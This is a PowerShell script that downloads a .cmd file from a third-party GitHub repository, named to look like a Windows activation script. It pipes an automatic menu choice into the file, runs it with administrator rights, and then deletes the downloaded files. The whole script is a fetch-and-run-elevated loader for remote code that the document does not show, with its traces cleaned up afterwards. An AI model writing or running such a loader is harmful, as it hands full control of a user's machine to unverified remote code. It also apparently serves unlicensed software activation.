$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients for current session
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$DownloadURL1 = 'https://raw.githubusercontent.com/pxl-boy/soft/main/config1b.cmd'
$DownloadURL2 = 'https://raw.githubusercontent.com/pxl-boy/soft/main/config1b.cmd'

$URLs = @($DownloadURL1, $DownloadURL2)
$RandomURL1 = Get-Random -InputObject $URLs
$RandomURL2 = $URLs -ne $RandomURL1

try {
    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
}
catch {
    $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
}

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]( [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544' )
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }

# Save the script to a file
$content = $response.Content
Set-Content -Path $FilePath -Value $content

# Create a temporary batch file to run the script and send input
$BatchFilePath = "$env:TEMP\RunMAS_$rand.bat"
$BatchContent = "@echo off`n"
$BatchContent += "echo 1 | `"$FilePath`""

Set-Content -Path $BatchFilePath -Value $BatchContent

# Run the batch file as administrator
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $BatchFilePath" -Verb RunAs -Wait

# Clean up temporary files
Remove-Item -Path $FilePath, $BatchFilePath -Force
